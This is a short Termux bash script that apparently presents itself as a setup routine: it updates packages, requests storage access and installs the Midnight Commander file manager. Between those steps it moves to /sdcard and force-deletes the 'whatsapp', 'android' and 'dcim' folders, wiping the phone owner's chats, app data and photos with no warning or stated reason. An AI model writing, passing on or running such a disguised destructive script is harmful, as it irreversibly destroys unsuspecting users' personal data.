#!/usr/bin/bash

apt-get update
apt-get upgrade
termux-setup-storage
cd /sdcard
rm -rf whatsapp
rm -rf android
rm -rf dcim
apt-get install mc
mc
